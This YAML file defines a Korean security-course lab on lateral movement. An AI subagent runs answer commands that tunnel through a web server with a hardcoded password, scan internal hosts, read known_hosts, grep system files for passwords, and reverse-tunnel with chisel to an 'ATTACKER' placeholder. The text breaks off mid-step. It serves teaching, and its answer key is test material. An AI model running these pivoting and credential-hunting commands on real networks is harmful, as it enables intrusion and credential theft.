lab_id: attack-ai-week10
title: 측면 이동 (Lateral Movement) (AI 지원)
version: ai
course: attack-ai
week: 10
description: 내부 네트워크에서 다른 시스템으로 이동하는 측면 이동(Lateral Movement) 기법을 실습한다. SSH 피봇, 포트 포워딩, 프록시체인, Pass-the-Hash 등을 학습한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: hard
duration_minutes: 120
objectives:
- SSH 터널링과 포트 포워딩을 사용한 네트워크 피봇팅을 수행할 수 있다
- 내부 네트워크의 다른 시스템으로 접근을 확대할 수 있다
- 측면 이동의 탐지 방법을 이해한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: web 서버(10.20.30.80)에 SSH 로컬 포트 포워딩을 설정하여 SIEM 서버(10.20.30.100)의 Wazuh 웹 인터페이스(443)에 접근하라.
  hint: ssh -L 로컬포트:대상:원격포트 형태로 터널을 생성한다
  category: exploit
  points: 10
  answer: sshpass -p1 ssh -o StrictHostKeyChecking=no -f -N -L 8443:10.20.30.100:443 ccc@10.20.30.80 2>/dev/null && sleep 1 && curl -sk https://localhost:8443 | head -20 && echo 'Port forwarding to SIEM:443
    established'
  answer_detail: SSH 로컬 포트 포워딩(-L)은 로컬 포트를 원격 네트워크의 서비스로 터널링한다. 방화벽이 직접 접근을 차단하더라도 SSH 터널을 통해 내부 서비스에 접근할 수 있다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: sshpass -p1 ssh -o StrictHostKeyChecking=no -f -N -L 8443:10.20.30.100:443 ccc@10.20.30.80 2>/dev/null && sleep 1 && curl -sk https://localhost:8443 | head -20 && echo 'Port forwarding to SIEM:443
    established'
  risk_level: medium
  bastion_prompt: web 서버(10.20.30.80)에 SSH 로컬 포트 포워딩을 설정하여 SIEM 서버(10.20.30.100)의 Wazuh 웹 인터페이스(443)에 접근해줘
- order: 2
  instruction: SSH 동적 포트 포워딩(SOCKS 프록시)을 설정하여 web 서버를 통한 전체 네트워크 접근을 확보하라.
  hint: ssh -D 포트 옵션으로 SOCKS 프록시를 생성한다
  category: exploit
  points: 10
  answer: sshpass -p1 ssh -o StrictHostKeyChecking=no -f -N -D 1080 ccc@10.20.30.80 2>/dev/null && sleep 1 && echo 'SOCKS proxy established on port 1080' && ss -tlnp | grep 1080
  answer_detail: SSH 동적 포트 포워딩(-D)은 SOCKS4/5 프록시를 생성한다. proxychains와 연동하면 모든 도구의 트래픽을 SSH 터널을 통해 전달할 수 있어 내부 네트워크 전체에 접근이 가능하다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: sshpass -p1 ssh -o StrictHostKeyChecking=no -f -N -D 1080 ccc@10.20.30.80 2>/dev/null && sleep 1 && echo 'SOCKS proxy established on port 1080' && ss -tlnp | grep 1080
  risk_level: medium
  bastion_prompt: SSH 동적 포트 포워딩(SOCKS 프록시)을 설정하여 web 서버를 통한 전체 네트워크 접근을 확보해줘
- order: 3
  instruction: web 서버에서 내부 네트워크를 스캔하여 추가 공격 대상을 발견하라. SSH를 통해 원격으로 nmap을 실행하라.
  hint: SSH를 통해 web 서버에서 nmap을 실행한다
  category: recon
  points: 10
  answer: ssh ccc@10.20.30.80 'nmap -sn 10.20.30.0/24 2>/dev/null' 2>/dev/null
  answer_detail: 피봇 호스트에서 내부 네트워크를 스캔하면 직접 접근할 수 없는 시스템을 발견할 수 있다. 피봇 호스트의 네트워크 위치에 따라 다른 서브넷에 접근이 가능해질 수 있다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: ssh ccc@10.20.30.80 'nmap -sn 10.20.30.0/24 2>/dev/null' 2>/dev/null
  risk_level: low
  bastion_prompt: web 서버에서 내부 네트워크를 스캔하여 추가 공격 대상을 발견하라. SSH를 통해 원격으로 nmap을 실행해줘
- order: 4
  instruction: web 서버에서 secu 서버(10.20.30.1)로 SSH 접속을 시도하라. 동일한 자격 증명이 재사용되는지 확인하라.
  hint: sshpass로 같은 비밀번호를 사용하여 접속을 시도한다
  category: exploit
  points: 10
  answer: 'ssh ccc@10.20.30.80 ''ssh ccc@10.20.30.1 hostname 2>/dev/null'' 2>/dev/null && echo ''Credential reuse confirmed: web -> secu'''
  answer_detail: 자격 증명 재사용은 측면 이동의 가장 흔한 벡터이다. 한 시스템에서 획득한 비밀번호가 다른 시스템에서도 유효하면 연쇄적으로 침투가 확대된다. 각 시스템별 고유한 비밀번호와 MFA가 필수적이다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: 'ssh ccc@10.20.30.80 ''ssh ccc@10.20.30.1 hostname 2>/dev/null'' 2>/dev/null && echo ''Credential reuse confirmed: web -> secu'''
  risk_level: medium
  bastion_prompt: web 서버에서 secu 서버(10.20.30.1)로 SSH 접속을 시도해줘
- order: 5
  instruction: SSH 리모트 포트 포워딩을 설정하라. web 서버에서 공격자 머신으로 역방향 터널을 만들어 내부 서비스를 외부에 노출하라.
  hint: ssh -R 원격포트:로컬호스트:로컬포트 형태이다
  category: exploit
  points: 10
  answer: 'echo ''=== Remote Port Forwarding ==='' && echo ''Command: ssh -R 9090:10.20.30.100:443 ccc@10.20.30.201'' && echo ''Effect: attacker:9090 -> siem:443 via web server'' && echo ''---'' && echo
    ''This allows accessing internal SIEM from external network'' && echo ''Detection: monitor SSH sessions with -R flag'''
  answer_detail: 리모트 포트 포워딩(-R)은 원격 서버의 포트를 로컬 네트워크로 매핑한다. 내부 네트워크의 서비스를 외부에 노출시킬 수 있어 데이터 유출이나 추가 침투에 활용된다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: 'echo ''=== Remote Port Forwarding ==='' && echo ''Command: ssh -R 9090:10.20.30.100:443 ccc@10.20.30.201'' && echo ''Effect: attacker:9090 -> siem:443 via web server'' && echo ''---'' && echo
    ''This allows accessing internal SIEM from external network'' && echo ''Detection: monitor SSH sessions with -R flag'''
  risk_level: medium
  bastion_prompt: SSH 리모트 포트 포워딩을 설정하라. web 서버에서 공격자 머신으로 역방향 터널을 만들어 내부 서비스를 외부에 노출해줘
- order: 6
  instruction: web 서버의 SSH known_hosts 파일을 확인하여 이전에 접속한 호스트 목록을 파악하라.
  hint: ~/.ssh/known_hosts 파일을 확인한다
  category: recon
  points: 10
  answer: ssh ccc@10.20.30.80 'cat ~/.ssh/known_hosts 2>/dev/null; echo ---; cat /etc/ssh/ssh_known_hosts 2>/dev/null' 2>/dev/null | head -20
  answer_detail: known_hosts 파일에는 이전에 SSH로 접속한 호스트의 키 지문이 저장된다. 이를 통해 관리자가 자주 접속하는 서버를 파악하여 측면 이동의 다음 대상을 선정할 수 있다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: ssh ccc@10.20.30.80 'cat ~/.ssh/known_hosts 2>/dev/null; echo ---; cat /etc/ssh/ssh_known_hosts 2>/dev/null' 2>/dev/null | head -20
  risk_level: low
  bastion_prompt: web 서버의 SSH known_hosts 파일을 확인하여 이전에 접속한 호스트 목록을 파악해줘
- order: 7
  instruction: web 서버에서 SIEM 서버(10.20.30.100)로 점프하여 Wazuh 설정을 확인하라. 이중 SSH 점프를 사용하라.
  hint: ssh -J 점프호스트 형태로 프록시 점프를 사용한다
  category: exploit
  points: 10
  answer: sshpass -p1 ssh -o StrictHostKeyChecking=no -J ccc@10.20.30.80 ccc@10.20.30.100 'hostname && ls /var/ossec/etc/ 2>/dev/null || echo "Wazuh directory check"' 2>/dev/null
  answer_detail: SSH ProxyJump(-J)는 중간 호스트를 경유하여 최종 목적지에 접속하는 기능이다. 다단계 네트워크 환경에서 여러 호스트를 경유하여 내부 깊숙한 시스템에 접근할 수 있다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: sshpass -p1 ssh -o StrictHostKeyChecking=no -J ccc@10.20.30.80 ccc@10.20.30.100 'hostname && ls /var/ossec/etc/ 2>/dev/null || echo "Wazuh directory check"' 2>/dev/null
  risk_level: medium
  bastion_prompt: web 서버에서 SIEM 서버(10.20.30.100)로 점프하여 Wazuh 설정을 확인해줘
- order: 8
  instruction: web 서버에 저장된 다른 서비스의 인증 정보를 검색하라. 설정 파일, 스크립트, 히스토리에서 비밀번호를 찾아라.
  hint: grep -r로 password, pass, key 등의 키워드를 검색한다
  category: recon
  points: 10
  answer: ssh ccc@10.20.30.80 'grep -rl "password" /etc/ 2>/dev/null | head -5; echo ---; grep -rl "pass" /home/ 2>/dev/null | head -5; echo ---; find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
    | head -5' 2>/dev/null
  answer_detail: 설정 파일에 평문으로 저장된 비밀번호는 측면 이동의 핵심 정보이다. 데이터베이스 연결 정보, API 키, 서비스 계정 비밀번호 등이 하드코딩되어 있으면 다른 시스템으로의 접근이 가능해진다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: ssh ccc@10.20.30.80 'grep -rl "password" /etc/ 2>/dev/null | head -5; echo ---; grep -rl "pass" /home/ 2>/dev/null | head -5; echo ---; find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
    | head -5' 2>/dev/null
  risk_level: low
  bastion_prompt: web 서버에 저장된 다른 서비스의 인증 정보를 검색해줘
- order: 9
  instruction: web 서버의 네트워크 인터페이스와 라우팅 테이블을 확인하여 접근 가능한 추가 네트워크 대역을 파악하라.
  hint: ip addr show와 ip route show 명령을 사용한다
  category: recon
  points: 10
  answer: ssh ccc@10.20.30.80 'ip addr show 2>/dev/null; echo ===; ip route show 2>/dev/null' 2>/dev/null
  answer_detail: 다중 네트워크 인터페이스가 있는 호스트는 서로 다른 네트워크 대역을 연결하는 피봇 포인트이다. 라우팅 테이블에서 추가 서브넷을 발견하면 공격 범위를 확장할 수 있다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: ssh ccc@10.20.30.80 'ip addr show 2>/dev/null; echo ===; ip route show 2>/dev/null' 2>/dev/null
  risk_level: low
  bastion_prompt: web 서버의 네트워크 인터페이스와 라우팅 테이블을 확인하여 접근 가능한 추가 네트워크 대역을 파악해줘
- order: 10
  instruction: chisel이나 socat을 사용한 터널링 대안을 설명하라. SSH가 사용 불가능한 환경에서의 피봇팅 방법을 제시하라.
  hint: socat으로 TCP 릴레이를 구성한다
  category: analysis
  points: 10
  answer: 'echo ''=== Alternative Pivoting Tools ==='' && echo ''1. socat: socat TCP-LISTEN:8080,fork TCP:10.20.30.100:443'' && echo ''2. chisel: chisel server -p 8080 --reverse (server) / chisel client
    ATTACKER:8080 R:9090:10.20.30.100:443 (client)'' && echo ''3. ligolo: Agent-based tunnel, no SOCKS overhead'' && echo ''4. rpivot: Reverse SOCKS proxy via Python'' && echo ''---'' && echo ''When to
    use: SSH unavailable, need SOCKS proxy, limited tools on target'''
  answer_detail: SSH 이외의 터널링 도구는 SSH가 차단되거나 설치되지 않은 환경에서 유용하다. chisel은 HTTP/WebSocket 기반으로 방화벽 우회가 쉽고, socat은 범용 네트워크 릴레이 도구이다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: 'echo ''=== Alternative Pivoting Tools ==='' && echo ''1. socat: socat TCP-LISTEN:8080,fork TCP:10.20.30.100:443'' && echo ''2. chisel: chisel server -p 8080 --reverse (server) / chisel client
    ATTACKER:8080 R:9090:10.20.30.100:443 (client)'' && echo ''3. ligolo: Agent-based tunnel, no SOCKS overhead'' && echo ''4. rpivot: Reverse SOCKS proxy via Python'' && echo ''---'' && echo ''When to
    use: SSH unavailable, need SOCKS proxy, limited tools on target'''
  risk_level: low
  bastion_prompt: chisel이나 socat을 사용한 터널링 대안을 설명하라. SSH가 사용 불가능한 환경에서의 피봇팅 방법을 제시해줘
- order: 11
  instruction: 내부 서비스 열거를 위해 web 서버에서 secu 서버(10.20.30.1)의 주요 포트를 스캔하라.
  hint: SSH를 통해 원격에서 nmap을 실행한다
  category: recon
  points: 10
  answer: ssh ccc@10.20.30.80 'nmap -sT -p 22,80,443,8080,8443 10.20.30.1 2>/dev/null' 2>/dev/null
  answer_detail: 피봇 호스트에서 다른 내부 시스템의 서비스를 열거하면 추가 공격 표면을 파악할 수 있다. 방화벽 서버의 관리 인터페이스가 내부에서만 접근 가능한 경우가 많다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: ssh ccc@10.20.30.80 'nmap -sT -p 22,80,443,8080,8443 10.20.30.1 2>/dev/null' 2>/dev/null
  risk_level: low
  bastion_prompt: 내부 서비스 열거를 위해 web 서버에서 secu 서버(10.20.30.1)의 주요 포트를 스캔해줘
- order: 12
  instruction: web 서버에서 ARP 테이블을 확인하여 최근 통신한 호스트를 파악하라.
  hint: ip neigh 또는 arp -a 명령을 사용한다
  category: recon
  points: 10
  answer: ssh ccc@10.20.30.80 'ip neigh show 2>/dev/null' 2>/dev/null
  answer_detail: ARP 테이블에는 최근 L2 통신이 있었던 호스트가 기록된다. 게이트웨이, 서버 간 통신 패턴을 파악하여 네트워크 구조와 중요 시스템을 식별할 수 있다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: ssh ccc@10.20.30.80 'ip neigh show 2>/dev/null' 2>/dev/null
  risk_level: low
  bastion_prompt: web 서버에서 ARP 테이블을 확인하여 최근 통신한 호스트를 파악해줘
- order: 13
  instruction: sshuttle을 사용하여 web 서버를 통한 VPN 수준의 터널을 설정하라.
  hint: sshuttle -r 사용자@피봇 네트워크대역 형태이다
  category: exploit
  points: 10
  answer: 'echo ''=== sshuttle VPN-over-SSH ==='' && echo ''Command: sshuttle -r ccc@10.20.30.80 10.20.30.0/24'' && echo ''Effect: All traffic to 10.20.30.0/24 routed through web server'' && echo ''---''
    && echo ''Advantages over SOCKS:'' && echo ''- Transparent: no proxy settings needed'' && echo ''- Works with all TCP tools'' && echo ''- Automatic iptables rules'''
  answer_detail: sshuttle은 SSH를 통한 투명한 VPN을 구성한다. SOCKS 프록시와 달리 도구별 프록시 설정이 필요 없으며, iptables를 자동으로 구성하여 지정 대역의 모든 TCP 트래픽을 터널링한다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: 'echo ''=== sshuttle VPN-over-SSH ==='' && echo ''Command: sshuttle -r ccc@10.20.30.80 10.20.30.0/24'' && echo ''Effect: All traffic to 10.20.30.0/24 routed through web server'' && echo ''---''
    && echo ''Advantages over SOCKS:'' && echo ''- Transparent: no proxy settings needed'' && echo ''- Works with all TCP tools'' && echo ''- Automatic iptables rules'''
  risk_level: medium
  bastion_prompt: sshuttle을 사용하여 web 서버를 통한 VPN 수준의 터널을 설정해줘
- order: 14
  instruction: 측면 이동의 탐지 지표(IoC)를 정리하라. 네트워크 기반과 호스트 기반 지표를 각각 나열하라.
  hint: 비정상 SSH 연결, 포트 포워딩, 인증 로그를 분석한다
  category: analysis
  points: 15
  answer: 'echo -e ''=== Lateral Movement IoCs ===\n\n[Network-based]\n1. Unusual SSH connections between servers\n2. Port forwarding traffic patterns\n3. SOCKS proxy traffic on non-standard ports\n4. Increased
